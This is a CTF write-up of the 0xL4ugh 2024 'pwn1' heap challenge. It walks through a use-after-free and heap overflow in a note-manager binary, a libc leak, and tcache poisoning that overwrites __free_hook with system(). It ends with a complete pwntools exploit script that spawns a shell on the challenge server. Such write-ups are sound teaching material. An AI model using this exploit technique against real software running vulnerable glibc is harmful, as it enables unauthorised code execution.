# 0xL4ughCTF2024 PWN - Pwn1

This week I took part in 0xL4ugh CTF along side 1400 other teams despite it being a busy week.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/3077be0a-a14b-44d0-aba1-eb83bab960de)

The pwn1 challenge was a medium difficulty pwn challenge with 63 solves

## Initial Analysis

Unzipping the file gives us an ELF file, libc-2.31 and the loader for it. To start off, we will first patch the binary using [pwninit](https://github.com/io12/pwninit) to use the provided libc.

```shell
└─$ file chall_patched     
chall_patched: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./ld-2.31.so, BuildID[sha1]=96e20e69c031cc67b1471e7f8435b9967b5a155f, for GNU/Linux 3.2.0, not stripped
```

Its a 64-bit executable and it is not stripped so thats always helpful.

```shell
└─$ checksec --file=chall_patched 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   77 Symbols        No    0               1               chall_patched
```

Looks like all the protections are enabled.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/1d16fe99-296d-4339-b3ee-40248d2396bc)

Running the binary shows that it is one of those menu challenges where you can manage your notes.

## Decompiled Code

```c
undefined8 main(EVP_PKEY_CTX *param_1)

{
  long in_FS_OFFSET;
  int option;
  int noteToDelete;
  int totalNotes;
  char *local_1b8;
  char *pChunk;
  char *notes [51];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  init(param_1);
  totalNotes = 0;
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            menu();
            __isoc99_scanf("%d",&option);
            getchar();
            if (option != 1) break;
            pChunk = (char *)malloc(0x28);
            puts("Enter the note");
            fgets(pChunk,10,stdin);
            puts("Note created");
            notes[totalNotes] = pChunk;
            totalNotes = totalNotes + 1;
          }
          if (option != 2) break;
          puts("Which note do you want to delete?");
          __isoc99_scanf("%d",&noteToDelete);
          getchar();
          if (totalNotes < noteToDelete) {
            puts("Invalid choice");
          }
          else {
            free(notes[noteToDelete + -1]);
          }
        }
        if (option != 3) break;
        puts("Which note do you want to edit?");
        __isoc99_scanf("%d",&noteToDelete);
        getchar();
        if (totalNotes < noteToDelete) {
          puts("Invalid choice");
        }
        else {
          fgets(notes[noteToDelete + -1],100,stdin);
          puts("Note edited");
        }
      }
      if (option != 4) break;
      puts("Which note do you want to read?");
      __isoc99_scanf("%d",&noteToDelete);
      getchar();
      if (totalNotes < noteToDelete) {
        puts("Invalid choice");
      }
      else {
        puts(notes[noteToDelete + -1]);
      }
    }
    if (option == 5) break;
    if (option == 10) {
      local_1b8 = (char *)malloc(0x4b0);
      puts("Enter the note");
      fgets(local_1b8,10,stdin);
      puts("Note created");
      notes[totalNotes] = local_1b8;
      totalNotes = totalNotes + 1;
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

- From the decompiled code above, we can see that option 1 creates a note by allocating memory from the heap and adds the pointer to that chunk into an array. 
- Option 2 lets us delete a note by free-ing up the heap chunk. However, the pointer to that specific chunk is still inside our array which gives us a Use-After-Free vulnerability. 
- Option 3 lets us edit a note but theres an obvious buffer overflow there. 
- Option 4 lets us read the content inside the heap chunk which we will use to get leaks later. 
- Additionally, theres option 10 which creates a really big heap chunk.

## Attack Strategy

I recently read a writeup from last week's CTF which was a heap challenge whereby the author overwrites the __free_hook by poisoning the tcache to create a fake chunk inside libc. So when I saw this challenge, this was the first thing that came to my mind. I did a quick google search and found that __free_hook has been removed from libc for version 2.34 and above. Luckily, the libc version that we are using is 2.31.

Heres some explanation of what __free_hook is from ChatGPT

> "__free_hook" is a hook function in the GNU C Library (glibc) that allows programmers to intercept calls to the free() function. The purpose of __free_hook is to provide a mechanism for developers to customize the behavior of memory deallocation. By default, __free_hook points to the standard free() function. However, you can set __free_hook to point to your own custom function

Our attack flow will be as follows :

1. Leak libc with option 10
2. Overflow into a free'd chunk to modify its FD and BK pointers to point to __free_hook
3. Create a chunk inside __free_hook and modify it to point to system()
4. Call free() on a chunk with "/bin/sh"

## Step 1 : Leak libc

```python
# Step 1 : Leak libc
p.sendlineafter(b"Exit\n", "10") # 1
p.sendline("AAAA")
create("AAAA") # 2
delete(1)
read(1)
leak = p.recvline().strip()
leak = leak + b"\x00\x00"
leak = u64(leak)
log.info(f"Libc leak : {hex(leak)}")
libc.address = leak - (0x007f99c0dd0be0 - 0x007f99c0be5000)
log.info(f"Libc base : {hex(libc.address)}")
```

We know that option 10 creates a really big heap chunk. When this big chunk is freed, it goes into the unsorted bin rather than the tcache because of its size. When this chunk is inside the unsorted bin, it contains pointers to the main arena, which is inside libc. Then, we will read its content to get a leak

Note : We will have to create another chunk (chunk #2) to prevent the big chunk from coalescing with the top chunk when free'd.

Then, to calculate the base of libc, we need to find the offset of the leak from the base. We can do this by obtaining the leak, then attach gdb to the process and run the command "vmmap" to find the base of libc. The leak should be subtracted with the base to find the offset. In my case, 0x007f99c0dd0be0 is the leak and 0x007f99c0be5000 is the base. We do this so that we can automatically obtain the libc address everytime the code is executed.

## Step 2 : Overflow into a free'd chunk to modify its FD and BK pointers to point to __free_hook

```python
create("BBBB") # 3
create("CCCC") # 4
create("DDDD") # 5
delete(5)
delete(4)
```

We will create a few chunks and free some of them.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/474118db-717c-458a-afca-ffd045d324ba)

The 2 chunks that we free'd are now in the tcache

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/ba7e9adf-286b-454b-b436-08ad58224b0e)

These are the 3 chunks that we created. The 2 chunks that we free'd now contain pointers to the next chunk. We will change this pointer to point to __free_hook_

```py
edit(3, b"A"*32 + p64(0) + p64(0x31) + p64(free_hook))
```

Overflow to the next chunk and change its FD pointer.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a95beef7-aa00-4c2a-a588-9fcb9f4af177)

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/bedfb51a-7345-45f8-97b9-819b27fd5952)

From the images above, we can see that we have successfully tricked the heap manager to think that theres a free chunk inside libc.

## Step 3 : Create a chunk inside __free_hook and modify it to point to system()

```py
create(p64(libc.sym["system"])) # 6
create(p64(libc.sym["system"])) # 7
```

Now, when we allocate new chunks, the chunk that will be returned will be from the tcache, and since we have poisoned the tcache, it will return a chunk thats located in __free_hook. All we have to do is just add system() inside it.

## Step 4 : Call free() on a chunk with "/bin/sh"

```py
create("/bin/sh") # 8
delete(8)
```

Now, when free(8) is called, its actually calling system("/bin/sh")

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/27ca3875-a191-4079-8cfb-bbb4d08c926b)

> Flag : 0xL4ugh{y3aaaahy000u_C4n_p0is0N_Tc4ch3_us1ng_h34p_0v3rfl0w}

## Solve Script

```py
#!/usr/bin/python
from pwn import *
import warnings
import time

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./chall_patched')
libc = ELF('./libc-2.31.so')

host = "20.55.48.101"
port = 1339

gdb_script = '''

'''

def debug(p):
	gdb.attach(p)
	p.interactive()

#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

def create(data):
	p.sendlineafter(b"Exit\n", "1")
	p.sendline(data)

def delete(idx):
	p.sendlineafter(b"Exit\n", "2")
	p.sendlineafter(b"delete?\n", str(idx))

def edit(idx, data):
	p.sendlineafter(b"Exit\n", "3")
	p.sendlineafter(b"edit?\n", str(idx))
	p.sendline(data)

def read(idx):
	p.sendlineafter(b"Exit\n", "4")
	p.sendlineafter(b"read?\n", str(idx))



# Step 1 : Leak libc
p.sendlineafter(b"Exit\n", "10") # 1
p.sendline("AAAA")
create("AAAA") # 2
delete(1)
read(1)
leak = p.recvline().strip()
leak = leak + b"\x00\x00"
leak = u64(leak)
log.info(f"Libc leak : {hex(leak)}")
libc.address = leak - (0x007f99c0dd0be0 - 0x007f99c0be5000)
log.info(f"Libc base : {hex(libc.address)}")

free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]
log.info(f"Free hook : {hex(free_hook)}")
log.info(f"System : {hex(system)}")

# Step 2 : Create a fake chunk
create("BBBB") # 3
create("CCCC") # 4
create("DDDD") # 5
delete(5)
delete(4)
edit(3, b"A"*32 + p64(0) + p64(0x31) + p64(free_hook))
create(p64(libc.sym["system"])) # 6
create(p64(libc.sym["system"])) # 7
create("/bin/sh") # 8
delete(8)

p.interactive()
```
